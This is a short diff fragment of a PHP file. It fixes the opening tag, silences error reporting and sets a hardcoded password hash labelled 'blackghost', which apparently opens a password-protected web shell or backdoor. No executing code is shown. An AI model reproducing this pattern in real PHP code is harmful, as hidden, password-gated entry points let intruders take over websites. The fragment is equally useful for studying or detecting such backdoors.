@@ -1,5 +1,4 @@
-
-?><?php 
+<?php 
 
 error_reporting(0); 
 $password = "40c0add9095bbf9e42c61c7341a18029"; //blackghost
